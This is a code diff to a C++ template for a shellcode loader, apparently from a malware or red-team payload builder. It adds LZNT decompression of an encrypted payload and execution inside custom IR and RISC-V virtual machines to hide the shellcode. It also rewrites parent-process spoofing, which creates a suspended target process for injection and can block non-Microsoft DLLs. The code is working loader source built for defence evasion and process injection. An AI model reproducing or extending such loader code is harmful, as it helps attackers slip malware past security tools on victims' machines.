@@ -10,6 +10,13 @@
 #include "common.hpp.in"
 #include "evasion.hpp.in"
 
+{{#IF EXEC_VM}}
+#include "vm_ir.hpp.in"
+{{#ENDIF}}
+{{#IF EXEC_RISCVM}}
+#include "vm_riscv.hpp.in"
+{{#ENDIF}}
+
 {{JUNK_CODE_BLOCKS}}
 
 // Encrypted payload
@@ -133,9 +140,60 @@ static void execute_local() {
     shellcode = decompressed;
     shellcode_len = decompressed_len;
 {{#ENDIF}}
+{{#IF COMPRESS_LZNT}}
+    uint8_t decompressed[ORIGINAL_SIZE + 256];
+    size_t decompressed_len = sizeof(decompressed);
+    if (!decompress_lznt(decrypted, decrypted_len, decompressed, sizeof(decompressed), &decompressed_len))
+        return;
+    shellcode = decompressed;
+    shellcode_len = decompressed_len;
+{{#ENDIF}}
 
 {{#IF SLEEP_IN_BETWEEN}}
     evasion_sleep({{SLEEP_IN_BETWEEN_SECONDS}});
+{{#ENDIF}}
+
+{{#IF EXEC_VM}}
+    {
+        uint8_t ir_blob[] = { {{VM_IR_BLOB}} };
+        vm_ir_execute(shellcode, shellcode_len, ir_blob, sizeof(ir_blob), {{VM_IR_SEED}});
+    }
+    SecureZeroMemory(decrypted, sizeof(decrypted));
+{{#IF COMPRESS_ZLIB}}
+    SecureZeroMemory(decompressed, sizeof(decompressed));
+{{#ENDIF}}
+{{#IF COMPRESS_LZ4}}
+    SecureZeroMemory(decompressed, sizeof(decompressed));
+{{#ENDIF}}
+{{#IF COMPRESS_RLE}}
+    SecureZeroMemory(decompressed, sizeof(decompressed));
+{{#ENDIF}}
+{{#IF COMPRESS_LZNT}}
+    SecureZeroMemory(decompressed, sizeof(decompressed));
+{{#ENDIF}}
+    return;
+{{#ENDIF}}
+
+{{#IF EXEC_RISCVM}}
+    {
+        uint8_t rv_code[] = { {{VM_RV_BLOB}} };
+        vm_riscv_execute(shellcode, shellcode_len, rv_code, sizeof(rv_code),
+                         {{VM_RV_SEED}}, {{VM_RV_XOR_KEY}});
+    }
+    SecureZeroMemory(decrypted, sizeof(decrypted));
+{{#IF COMPRESS_ZLIB}}
+    SecureZeroMemory(decompressed, sizeof(decompressed));
+{{#ENDIF}}
+{{#IF COMPRESS_LZ4}}
+    SecureZeroMemory(decompressed, sizeof(decompressed));
+{{#ENDIF}}
+{{#IF COMPRESS_RLE}}
+    SecureZeroMemory(decompressed, sizeof(decompressed));
+{{#ENDIF}}
+{{#IF COMPRESS_LZNT}}
+    SecureZeroMemory(decompressed, sizeof(decompressed));
+{{#ENDIF}}
+    return;
 {{#ENDIF}}
 
     HANDLE hProc = GetCurrentProcess();
@@ -310,6 +368,9 @@ static void execute_local() {
 {{#IF COMPRESS_RLE}}
     SecureZeroMemory(decompressed, sizeof(decompressed));
 {{#ENDIF}}
+{{#IF COMPRESS_LZNT}}
+    SecureZeroMemory(decompressed, sizeof(decompressed));
+{{#ENDIF}}
 }
 {{#ENDIF}}
 
@@ -354,35 +415,64 @@ static void execute_remote() {
 
 {{#IF PPID_SPOOF}}
     // PPID spoofing - create suspended process with spoofed parent
-    STARTUPINFOEXW si = {};
-    PROCESS_INFORMATION pi = {};
-    si.StartupInfo.cb = sizeof(si);
+    {
+        DWORD parent_pid = 0;
+        HANDLE hParentSnap = pSnap(0x2, 0);
+        if (hParentSnap != INVALID_HANDLE_VALUE) {
+            PROCESSENTRY32W ppe = {};
+            ppe.dwSize = sizeof(ppe);
+            if (pFirst(hParentSnap, &ppe)) {
+                do {
+                    const wchar_t* ppname = obf_wide(L"{{PPID_PROCESS}}");
+                    if (lstrcmpiW(ppe.szExeFile, ppname) == 0) {
+                        parent_pid = ppe.th32ProcessID;
+                        break;
+                    }
+                } while (pNext(hParentSnap, &ppe));
+            }
+            CloseHandle(hParentSnap);
+        }
 
-    SIZE_T attr_size = 0;
-    InitializeProcThreadAttributeList(NULL, 1, 0, &attr_size);
-    si.lpAttributeList = reinterpret_cast<LPPROC_THREAD_ATTRIBUTE_LIST>(
-        HeapAlloc(GetProcessHeap(), 0, attr_size));
-    InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &attr_size);
-
-    // Find parent PID
-    DWORD parent_pid = 0;
-    // ... (similar snapshot for parent process)
-    HANDLE hParent = OpenProcess(PROCESS_ALL_ACCESS, FALSE, parent_pid);
-    UpdateProcThreadAttribute(si.lpAttributeList, 0,
-        PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &hParent, sizeof(hParent), NULL, NULL);
+        if (parent_pid != 0) {
+            HANDLE hParent = OpenProcess(PROCESS_CREATE_PROCESS, FALSE, parent_pid);
+            if (hParent) {
+                DWORD attr_count = 1;
+{{#IF BLOCK_DLLS}}
+                attr_count = 2;
+{{#ENDIF}}
+                STARTUPINFOEXW si = {};
+                PROCESS_INFORMATION pi = {};
+                si.StartupInfo.cb = sizeof(si);
+                SIZE_T attr_size = 0;
+                InitializeProcThreadAttributeList(NULL, attr_count, 0, &attr_size);
+                si.lpAttributeList = reinterpret_cast<LPPROC_THREAD_ATTRIBUTE_LIST>(
+                    HeapAlloc(GetProcessHeap(), 0, attr_size));
+                if (si.lpAttributeList) {
+                    InitializeProcThreadAttributeList(si.lpAttributeList, attr_count, 0, &attr_size);
+                    UpdateProcThreadAttribute(si.lpAttributeList, 0,
+                        PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
+                        &hParent, sizeof(hParent), NULL, NULL);
 
 {{#IF BLOCK_DLLS}}
-    DWORD64 policy = 0x100000000000; // PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON
-    UpdateProcThreadAttribute(si.lpAttributeList, 0,
-        PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY, &policy, sizeof(policy), NULL, NULL);
+                    DWORD64 policy = 0x100000000000;
+                    UpdateProcThreadAttribute(si.lpAttributeList, 0,
+                        PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY,
+                        &policy, sizeof(policy), NULL, NULL);
 {{#ENDIF}}
 
-    CreateProcessW(NULL, const_cast<LPWSTR>(obf_wide(L"{{TARGET_PROCESS}}")),
-                   NULL, NULL, FALSE,
-                   EXTENDED_STARTUPINFO_PRESENT | CREATE_SUSPENDED,
-                   NULL, NULL, &si.StartupInfo, &pi);
-    target_pid = pi.dwProcessId;
-    // Use pi.hProcess for injection target
+                    wchar_t cmd[] = L"{{TARGET_PROCESS}}";
+                    if (CreateProcessW(NULL, cmd, NULL, NULL, FALSE,
+                            EXTENDED_STARTUPINFO_PRESENT | CREATE_SUSPENDED,
+                            NULL, NULL, &si.StartupInfo, &pi)) {
+                        target_pid = pi.dwProcessId;
+                    }
+                    DeleteProcThreadAttributeList(si.lpAttributeList);
+                    HeapFree(GetProcessHeap(), 0, si.lpAttributeList);
+                }
+                CloseHandle(hParent);
+            }
+        }
+    }
 {{#ENDIF}}
 
     // Open target process via syscall
